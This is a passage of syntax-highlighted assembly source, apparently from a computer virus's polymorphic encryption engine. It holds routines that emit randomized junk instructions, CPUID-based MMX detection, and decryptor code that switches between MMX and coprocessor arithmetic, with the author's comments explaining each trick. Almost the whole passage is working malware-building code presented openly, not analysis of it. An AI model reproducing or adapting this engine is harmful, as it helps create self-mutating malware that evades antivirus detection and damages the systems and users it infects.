        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_rs_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cmp2t2_type_2</span><span class="sc0">
    </span><span class="sc5">__cmp2t2_type_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">32d</span><span class="sc4">-</span><span class="sc2">21d</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_part_3</span><span class="sc0">

    </span><span class="sc5">__cmp2t2_type_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm_main_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">22d</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_part_3</span><span class="sc0">

    </span><span class="sc5">__cm_part_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc5">__cmp3_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">    </span><span class="sc1">;wow!</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">;reserved for far c-jump</span><span class="sc0">

        </span><span class="sc1">; select a empty reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;value to EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;EAX register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A20Fh</span><span class="sc0">       </span><span class="sc1">;CPUID instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000100b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">11111010b</span><span class="sc0">

        </span><span class="sc1">;1st byte of b-instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_bt_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_bt_imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_bt_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;EDX test for IA-MMX flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">23</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">; generate conditional jump (JNC)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">830fh</span><span class="sc0">    </span><span class="sc1">;JNC far jump</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">;far jump has six bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;put short conditional jump</span><span class="sc0">

    </span><span class="sc5">__cm_after_test</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ch</span><span class="sc0">          </span><span class="sc1">;PUSHF instruction</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">; enable registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function for simulate MMX and Copro code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Is computer really supports MMX instructions ? Why can I</span><span class="sc0">
        </span><span class="sc1">;find out in decode-loop ? Hmmm, it's very easy !</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   POPF</span><span class="sc0">
        </span><span class="sc1">;   PUSHF</span><span class="sc0">
        </span><span class="sc1">;   JNC/JC  NO_MMX      - jump if MMX (not) support</span><span class="sc0">
        </span><span class="sc1">;   -mmx instructions-</span><span class="sc0">
        </span><span class="sc1">;  NO_MMX:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;see on __cpuid_mmx function to know more...</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;If I use MMX instructions and I'll call g_copro_others to</span><span class="sc0">
        </span><span class="sc1">;generate some copro-garbages what will be then ? I cannot</span><span class="sc0">
        </span><span class="sc1">;rewrite MMX regz (to use copro-regz). So, I can call this</span><span class="sc0">
        </span><span class="sc1">;function with JC jump.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:     AL = (0=JNC, 1=JC)  ;JNC=MMX, JC=copro</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__mts_start</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;where is JNC/JC jump ?</span><span class="sc0">
        </span><span class="sc5">__mts_style</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;JNC or JC ?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__mmx_test_start</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_lmmx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_lmmx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__mmx_ts_finish</span><span class="sc0">

        </span><span class="sc1">; save style</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mts_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; put POPF + PUSHF instruction</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Dh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ch</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">; save actual EDI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mts_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">

    </span><span class="sc5">__mmx_ts_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__mmx_test_finish</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_lmmx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_lmmx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__mmx_tf_finish</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; generate the conditional jump (JNC/JC)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">830Fh</span><span class="sc0">              </span><span class="sc1">;JNC mmx-jump</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mts_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mtf_okay</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">820Fh</span><span class="sc0">              </span><span class="sc1">;JC copro-jump</span><span class="sc0">
    </span><span class="sc5">__mtf_okay</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mts_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">__mmx_tf_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function for generate reg32 &lt;-&gt; mm(0..7) / movd/movq ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Functions can move reg32 to/from MMX registers.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:        AX=(AH=reg32, AL=mmX)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__mmx_movin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; test if computer supports MMX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">

        </span><span class="sc1">; generate instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6E0Fh</span><span class="sc0">
    </span><span class="sc5">__mm_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__mmx_movout</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; does CPU support MMX ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">

        </span><span class="sc1">; generate instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7E0Fh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__mm_after</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function for generate add/sub with MMX and reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function can (add/sub) any MMX register with reg32.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:        AX=(AH=reg32, AL=mmX)</span><span class="sc0">
        </span><span class="sc1">;          BL=(0=add, 1=sub)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__mmx_as_regs</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;input regz</span><span class="sc0">
        </span><span class="sc5">__mmx_as_type</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;add OR sub ?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__mmx_add_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mmx_as_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mmx_as_type</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

        </span><span class="sc1">; support MMX ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">

        </span><span class="sc1">; we must b-reg32 move to mmx-reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg_mmx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mmx_as_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_movin</span><span class="sc0">

        </span><span class="sc1">; generate instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FE0Fh</span><span class="sc0">       </span><span class="sc1">;PADDD ...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mmx_as_type</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mas_sub</span><span class="sc0">

    </span><span class="sc5">__mas_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mmx_as_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__mas_finish</span><span class="sc0">

    </span><span class="sc5">__mas_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FA0Fh</span><span class="sc0">       </span><span class="sc1">;PSUBD ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__mas_after</span><span class="sc0">

    </span><span class="sc5">__mas_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to add/sub/mov with copro/mmx reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This is my one of the last function which I wrote. So,</span><span class="sc0">
        </span><span class="sc1">;the function which you see can generate ADD/SUB/MOV</span><span class="sc0">
        </span><span class="sc1">;instruction to MMX or Copro by this example:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   JNZ    NO_MMX</span><span class="sc0">
        </span><span class="sc1">;   PADDD/PSUBD/MOVD...</span><span class="sc0">
        </span><span class="sc1">;   JMP    COPRO_END</span><span class="sc0">
        </span><span class="sc1">; NO_MMX:</span><span class="sc0">
        </span><span class="sc1">;   FIADD/FISUB/FILD...</span><span class="sc0">
        </span><span class="sc1">; COPRO_END:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;I can't add-sub with copro/mmx directly value because</span><span class="sc0">
        </span><span class="sc1">;copro/mmx don't support it.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:        AX= (AH=reg32, AL=mmX)</span><span class="sc0">
        </span><span class="sc1">;          BH= (0 =to, 1=from - only for MOV)</span><span class="sc0">
        </span><span class="sc1">;          BL= add/sub/mov ? (0=ADD,1=SUB,2=MOV)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ppe_me_regs</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;input registers</span><span class="sc0">
        </span><span class="sc5">__ppe_me_oper</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;input operation</span><span class="sc0">
        </span><span class="sc5">__ppe_me_tofrom</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;MOV: to, from</span><span class="sc0">
        </span><span class="sc5">__ppe_in_memory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;value in memory</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_math_extended</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_oper</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_tofrom</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; test if we far (only because of copro)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_where_in_mem</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">a_math_extended</span><span class="sc0">

        </span><span class="sc1">; support MMX - the first test + JNZ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">

        </span><span class="sc1">; now, we will generate add-sub for MMX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
